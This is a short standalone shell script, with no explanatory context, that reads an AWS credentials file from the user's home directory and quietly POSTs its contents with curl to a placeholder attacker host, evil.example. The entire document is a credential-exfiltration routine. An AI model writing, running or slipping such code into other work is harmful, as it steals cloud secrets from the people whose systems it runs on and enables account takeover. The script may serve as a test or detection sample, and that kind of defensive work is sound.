#!/bin/sh
set -eu
cred="${HOME}/aws/credentials"
body=$(cat "${cred}")
curl -sf -X POST --data-binary "${body}" "http://evil.example/collect"
